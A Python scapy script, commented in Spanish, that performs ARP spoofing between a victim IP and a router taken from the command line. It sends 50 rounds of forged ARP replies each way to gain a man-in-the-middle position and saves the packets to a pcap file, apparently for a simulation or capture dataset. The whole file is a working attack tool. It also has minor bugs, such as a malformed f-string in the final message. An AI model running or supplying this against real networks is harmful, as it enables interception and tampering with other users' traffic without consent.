import subprocess
import sys
import socket
from datetime import datetime
from contextlib import closing
import scapy.all as scapy

iface = r"\Device\NPF_{4C19F751-9A06-4B55-B1EA-C49F268FC666}"

# fuction to get MAC of the victim
def get_MAC(ip_ataque: str):
    pkt = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=ip_ataque)
    ans = scapy.srp(pkt, iface=iface, timeout=3, verbose=False)[0]
    if ans:
        return ans[0][1].hwsrc
    # fallback: leer tabla arp
    out = subprocess.check_output(["arp", "-a"], text=True, encoding="utf-8")
    for line in out.splitlines():
        if ip_ataque in line:
            parts = line.split()
            for p in parts:
                if "-" in p and len(p.split("-")) == 6:
                    return p.replace("-", ":").lower()
    return None

# fuction to generate de ARP spoofing
def arp_Spoof(ip_atacante: str, ip_victima: str, paquetes: list):
    packet = scapy.ARP(op = 2, pdst = ip_atacante, hwdst = get_MAC(ip_victima), psrc = ip_victima)
    scapy.send(packet, verbose=False)
    paquetes.append(packet)
    
def generate_pcap(ip_maquina: str, ip_victima: str, ip_router: str):
    paquetes = []
    tam = 0
    # cambiar esta parte de aqui para que se salga al hacer control+C y que se genere el pcap.
    while tam < 50:
            arp_Spoof(ip_victima=ip_victima, ip_atacante=ip_router, paquetes=paquetes)
            arp_Spoof(ip_victima=ip_router, ip_atacante=ip_victima, paquetes=paquetes)
            sys.stdout.flush()
            tam += 1
    
    if not paquetes:
        print("[!] No se ha generado ningun paquete")
        sys.exit(1)
    
    salida = 'arp_spoofing.pcap'
    scapy.wrpcap(salida, paquetes)
    print("f[✔] pcap de ataque guardado en: {salida} (paquetes: {len(paquetes)})")
    

def main():
    if(len(sys.argv) != 3):
        print("[!] No has pasado la IP de la maquina y/o router a la que se le hace un apr spoofing\n")
        print("Nombre de archivo <ip_victima> <ip_router>")
        sys.exit(1)
    
    Ip_ataque = sys.argv[1] # obtencion de la ip en formato string
    router = sys.argv[2] # obtencion de la ip de la maquina
    # obtencion de mi ip para hacer una somulacion y obtener un man in the middle.
    hostname = socket.gethostname()
    ip_host = socket.gethostbyname(hostname)
    generate_pcap(ip_host, Ip_ataque, router)


if __name__ == "__main__":
    main()